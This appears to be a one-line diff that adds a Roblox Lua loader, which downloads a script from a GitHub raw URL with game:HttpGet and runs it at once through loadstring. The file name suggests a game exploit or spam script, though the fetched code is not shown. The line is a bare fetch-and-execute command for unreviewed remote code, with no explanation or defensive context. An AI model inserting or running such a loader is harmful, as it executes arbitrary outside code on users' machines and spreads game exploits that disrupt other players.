@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/nuke-a-country-spam6-ne3f1iwroesf68.lua"))()
